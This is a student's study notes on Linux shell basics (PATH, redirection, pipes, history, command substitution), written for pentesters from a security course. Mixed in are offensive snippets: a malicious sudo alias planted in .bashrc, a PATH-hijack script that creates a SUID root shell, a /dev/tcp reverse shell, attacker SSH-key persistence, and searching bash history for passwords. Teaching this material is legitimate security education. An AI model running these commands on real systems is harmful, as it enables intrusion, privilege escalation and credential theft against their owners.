# 🐚 06 - Shells: The Nervous System of Linux

## Status: 🟢 Completed

---

> ### 🧠 The Big Picture
> This lesson teaches you the **nervous system** of Linux — how commands talk to each other, how to extract results without disturbing the system, and how to avoid throwing errors that expose you. It's about hiding your tracks while getting exactly what you need.

### 📍 Where This Shows Up in Your Life as a Pentester
The moment you land on a server, you're **blind** — there's no interface. If you don't know how to redirect output (**Redirection**) or filter through memory (**Pipes**) without writing to disk and leaving evidence for the Blue Team, you'll get caught within the first 5 minutes. **Variables** are exactly what we manipulate to pull off **Privilege Escalation**.

---

## 🐢 Part 1: Types of Shells — Just What You Need, Nothing More
You don't need to memorize every technical difference between shells — just the practical essentials:

| Shell | Why It Matters |
|---|---|
| **Bash** | The global standard for scripting. Any exploit script or payload you find online will almost certainly be written in Bash — you need to be 100% comfortable in it. |
| **Zsh** | The default shell in Kali — your prompt looks a bit different from Bash, but almost everything you'll learn behaves identically. |

If you land on a reverse shell on an unfamiliar machine, you won't know in advance which shell is running. Check with:

~~~bash
echo $0        # tells you which shell you're currently in
~~~

### 🧱 Built-in Commands vs. Binaries
`cd` isn't a binary sitting on the disk somewhere — it's built directly into the shell itself. This matters for one specific reason: if you're enumerating a machine and try:

~~~bash
which cd
~~~

You'll get an empty result or an error — not because `cd` doesn't exist, but because it's built-in. This is different from commands like `ls` or `cat`, which are genuine binaries living in `/bin` or `/usr/bin`.

### 🔒 Why This Matters for Security
If you've pulled off a restricted shell escape (breaking out of a limited-privilege shell), some built-in commands will keep working even if their corresponding binaries were deleted or the PATH gets locked down — because built-ins don't depend on the filesystem at all.

### 🤔 So What Exactly Is a Shell?
The shell is the translator that takes your words and passes them to the system's kernel. Sometimes this translator has commands memorized internally (built-in, like `cd`), and sometimes it has to go search for a separate program to run (like `ls`).

### 🎯 The Philosophical "Why"
Imagine if `cd` were a separate program. Every time you typed `cd`, the system would launch a program to move you somewhere — and the instant that program closed, you'd snap right back to where you started! This is exactly why `cd` must be built into the interpreter itself.

### 🎭 Aliases — A Weapon in Disguise
We learned about aliases as shortcuts (like aliasing `clear`). As hackers, here's how we weaponize this: we get into a victim's server, navigate to their `.bashrc` file, and add:

~~~bash
alias sudo='sudo -S /tmp/malicious_script.sh'
~~~

Now, every single time the victim types `sudo` to install something, they unknowingly execute our malware first — and hand over their password in the process!

---

## 🧭 Part 2: Environment Variables — PATH, The Most Important Variable in All of Linux
Let's expand on this properly, because it's genuinely one of the most famous privilege escalation techniques in the world.

### 🤔 What Even Is PATH? (From the Ground Up)
When you type `ls` in the terminal, the shell doesn't have some "magical" knowledge of where that program lives. It searches through a specific, ordered list of directories, and takes the first match it finds. That list is the PATH.

~~~bash
echo $PATH
~~~

Typical output:

~~~text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
~~~

Why does order matter? The shell searches left to right. The first directory containing a match is the one that gets executed.

### 🧨 Exploit Spotlight: PATH Hijacking (Full Breakdown)
Imagine you're an attacker with write access to `/tmp` (which is world-writable, as we covered earlier), and you discover that the victim (a regular user, or even root) has the habit of adding the current directory (`.`) to the beginning of their PATH — for the "convenience" of running local scripts more easily. Their PATH now looks like this:

~~~text
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
~~~

Here's the attacker's move:

~~~bash
cd /tmp
echo '#!/bin/bash' > ls
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /bin/ls' >> ls
chmod +x ls
~~~

Now there's a binary named `ls` sitting inside `/tmp`. When the victim navigates into `/tmp` (for any reason — even by accident) and types `ls`, since the current directory (`.`) is the first entry in their PATH, the system finds the fake `ls` before it ever reaches the real `/bin/ls`, and executes it. If the victim happened to be root at that moment, this script creates a copy of `bash` with the SUID bit set — granting a full root shell to anyone, forever after.

> 🧨 **This is an officially documented technique** — [CWE-426: Untrusted Search Path]

### 🛡️ Blue Team Defense
The official protection is ensuring PATH never contains `.` or any world-writable directory. Best practice: always use the full path — `./script.sh` instead of just `script.sh` — when you deliberately want to run something from the current directory.

### 🔎 More Essential Variables

~~~bash
echo $HOME    # path to the home directory
echo $USER    # current username
echo $SHELL   # default shell
~~~

### ⚠️ A Critical Point the Lecturer Completely Skipped
In any reverse shell you land, the very first thing that's often broken is the environment variables, and this causes a lot of headaches:

~~~bash
whoami
echo $PATH    # might be empty or incomplete!
~~~

If `$PATH` is empty or incomplete, even basic commands like `ls` might fail to run unless you type the full path (`/bin/ls`). This is exactly why the very first thing any professional pentester does after landing a reverse shell is:

~~~bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
~~~

### 🌐 Global vs. Local Variables — Why It Matters for Scripting
The practical use case in your field: when you write a Bash script for recon automation (and you'll write plenty of these), if you define a variable inside the script without `export`, any other script you run from inside this one won't see that variable. This causes very strange bugs if you don't understand the difference.

~~~bash
COUNT=5              # local — subshells won't see this
export COUNT=5       # global — anything executed from this shell will see it
~~~

---

## 🔌 Part 3: stdin, stdout, stderr — The Foundation of Everything You'll Do in Recon
This is one of the most important lessons in the entire course from a daily practical standpoint. Let's understand it from the ground up.

### 🤔 Why Do Three Separate Channels Even Exist? (From the Roots)
When any program executes, the system opens up 3 default "pipes" for it:

| Channel | Number | Default Source/Destination |
|---|---|---|
| `stdin` | 0 | Where the program reads input from (default: keyboard) |
| `stdout` | 1 | Where the program prints its normal output (default: screen) |
| `stderr` | 2 | Where the program prints errors (default: screen too — but a completely separate channel) |

### 🎯 The Important Philosophical Question
Why aren't `stdout` and `stderr` the same channel?
The answer: so you can separate them. If everything got mixed into a single channel, you'd never be able to isolate just the correct results while ignoring errors, or vice versa.

### ⚡ Immediate Application

~~~bash
find / -name "*.conf" > results.txt
~~~

What this does: redirects only `stdout` to the file. Note: any error like "Permission denied" will still appear on your screen normally, because `>` only redirects `stdout`.

### 🔀 Merging stdout and stderr Together

~~~bash
find / -name "*.txt" > all_output.txt 2>&1
~~~

Explanation: This redirects `stdout` to the file first, then `2>&1` means: "take `stderr` and send it to the same place `stdout` is going." Order matters enormously here — if you write it backwards (`2>&1 > file.txt`), it won't work correctly, because the shell parses commands from left to right.

---

## 🚰 Part 4: Pipes — The Most Important Tool in the Entire Command Line
Let's go deeper here, because every single one-liner you'll use in your professional recon career is built on this exact idea.

**The Core Concept**

~~~bash
command1 | command2
~~~

Takes the `stdout` of `command1` and feeds it directly as `stdin` to `command2` — without ever passing through an intermediate file.

### 🎬 Real-World Scenario (Bug Bounty Enumeration)

~~~bash
cat subdomains.txt | httpx | grep 200
~~~

Here, you're taking a list of subdomains, feeding them into `httpx` to check which ones are actually alive, then filtering to keep only the ones that returned status code 200. This is the exact same principle taught with `ls | head | tail` — just applied in a real-world context.

### The Difference Between `|` and `|&`
`|` only passes `stdout`. `|&` passes both `stdout` and `stderr` together.

**Practical Use**

~~~bash
find / -name "*.php" 2>&1 | grep -v "Permission denied"
~~~

A genuinely real-world example: we merge `stderr` into `stdout` first, then use `grep -v` (meaning "exclude") to strip out "Permission denied" messages, leaving only the results that actually matter.

---

## 📜 Part 5: Command History — Quick and Practical
The one practical point genuinely worth stopping for:

~~~bash
history | grep "ssh"
~~~

### 🔒 The Security Use Case
If you land on a machine and get your hands on another user's `.bash_history` (as covered in an earlier lesson), searching it for words like `ssh`, `mysql`, or `password` should be the very first thing you do. Plenty of people accidentally type their password in the wrong place — like typing `ssh user@host` and then mistakenly typing the password as if it were part of the command — and it gets permanently logged in the history.

~~~bash
!!          # repeat the last command
!123        # repeat command number 123 from history
!ssh        # repeat the last command that started with "ssh"
~~~

---

## 🔗 Part 6: Command Substitution — The Foundation of Every Real Script
This is critically important, because it's the exact method you'll use to build every Bash script or exploit chain.

**The Concept**

~~~bash
echo "Today is $(date)"
~~~

`$()` tells the shell to execute the command inside it first, and substitute it with the result, before executing the rest of the line.  ### Backticks vs. `$()`
`$()` is preferred because it allows nesting. Here's a practical example of why that matters:  ~~~bash echo "Kernel: $(uname -r), IP: $(hostname -I)" ~~~  If you tried nesting commands using old-style backticks, you'd run into escaping headaches. `$()` lets you nest commands inside each other effortlessly:

~~~bash
echo "Files modified today: $(find $(pwd) -mtime -1 | wc -l)"
~~~

### 🎬 Real Use in Exploit Scripts
This is what you'll actually use in automation Bash scripts:

~~~bash
TARGET_IP=$(hostname -I | awk '{print $1}')
echo "My IP is: $TARGET_IP"
~~~

### 🎬 Real Reverse Shell Scenario
When crafting a payload and you want to embed dynamic variables:

~~~bash
bash -i >& /dev/tcp/$(cat attacker_ip.txt)/4444 0>&1
~~~

This dynamically pulls the attacker's IP from a file instead of hardcoding it — extremely useful if the same script needs to be reused across multiple engagements with different attacker IPs.

---

## 🎯 Redirection & Pipes — `>`, `>>`, `2>`, `|`
How to send output to a file (`>` or `>>`) and how to hide errors (`2>`).

**The Core Difference**

| Operator | Behavior |
|---|---|
| `>` | Wipes the old content and writes fresh (like reformatting a flash drive). |
| `>>` | Appends to the existing content (like adding a new page to a notebook). |

### ⚠️ A Warning That Could End Your Entire Engagement
If you're compromising a server and want to plant your SSH key for comfortable future access, you'd write:

~~~bash
echo "YOUR_KEY" >> ~/.ssh/authorized_keys
~~~

If you fumble and use a single `>` instead, you'll wipe out the admin's original keys! The admin tries to log in, can't, immediately realizes the server has been compromised, and locks you out entirely. Game Over.

### 🕳️ The Black Hole: `/dev/null`
This is a black hole. We throw command errors into it so we don't get exposed. As hackers, we use this while hunting for vulnerabilities:

~~~bash
find / -perm -4000 2>/dev/null
~~~

We're telling the system: "Find me the important files, and throw any 'Permission Denied' errors straight into the trash so my eyes don't have to suffer."

### 🚰 Pipes (`|`)
Takes the result of one command and hands it directly to the next command in memory (RAM), without ever creating intermediate files. This is the hacker's way of life — filtering results in seconds.

---

## 🧾 Final Wisdom
> *"Linux is blind, and Variables are its senses, and PATH is its guide. Pipes (`|`) are your secret weapon for operating entirely in RAM without ever touching the ground and leaving evidence. `>>` is how you build your legacy — but a single `>` can bring the whole server crashing down on your head and expose you completely."*

---
*This content was studied and written in my own words based on the concepts covered in TCM Security's Linux 101 course. Any errors in explanation or terminology are entirely my own.*
